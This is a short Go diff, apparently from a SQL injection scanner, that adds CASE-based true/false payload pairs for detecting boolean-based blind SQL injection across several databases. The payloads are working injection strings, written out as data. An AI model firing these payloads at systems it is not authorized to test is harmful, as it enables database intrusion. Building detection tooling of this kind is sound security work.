@@ -38,6 +38,11 @@ var booleanPayloadPairs = []booleanPayloadPair{
 	{"numeric-or", " OR 1=1", " OR 1=2"},
 	{"numeric-comment", " AND 1=1 --", " AND 1=2 --"},
 	{"numeric-or-comment", " OR 1=1 --", " OR 1=2 --"},
+	// CASE-based: works on SQLite/MySQL/MSSQL/PG where simple AND/OR fails
+	// because the injected value breaks the quoting context differently.
+	{"case-when", "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END AND '1'='1", "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END AND '1'='1"},
+	{"case-when-comment", "' AND CASE WHEN 1=1 THEN 1 ELSE 0 END --", "' AND CASE WHEN 1=2 THEN 1 ELSE 0 END --"},
+	{"case-or-comment", "' OR CASE WHEN 1=1 THEN 1 ELSE 0 END --", "' OR CASE WHEN 1=2 THEN 1 ELSE 0 END --"},
 }
 
 // DetectBoolean probes a parameter for boolean-based blind SQLi by
